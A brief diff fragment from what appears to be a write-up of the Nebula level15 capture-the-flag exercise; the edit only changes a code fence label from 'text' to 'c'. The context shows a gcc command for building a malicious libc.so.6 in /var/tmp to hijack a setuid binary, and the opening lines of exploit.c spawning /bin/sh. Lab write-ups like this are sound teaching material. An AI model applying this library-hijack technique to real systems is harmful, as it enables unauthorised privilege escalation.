@@ -886,7 +886,7 @@ level15@nebula:/home/flag15$ ldd ./flag15
 
 Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
 
-```text
+```c
 #include<stdlib.h>
 #define SHELL "/bin/sh"
 
